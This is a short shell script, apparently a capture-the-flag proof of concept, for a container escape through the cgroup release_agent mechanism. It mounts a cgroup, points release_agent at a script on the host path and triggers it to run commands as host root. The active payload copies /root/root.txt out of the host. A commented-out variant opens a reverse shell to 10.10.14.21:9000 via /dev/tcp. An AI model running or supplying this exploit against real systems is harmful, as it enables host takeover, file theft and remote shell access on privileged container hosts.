# In the container
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
 
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent

#For a normal PoC =================
echo '#!/bin/sh' > /cmd
echo "cat /root/root.txt > $host_path/output" >> /cmd
chmod a+x /cmd
#===================================
#Reverse shell
# echo '#!/bin/bash' > /cmd
# echo "bash -i >& /dev/tcp/10.10.14.21/9000 0>&1" >> /cmd
# chmod a+x /cmd
#===================================
 
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
head /output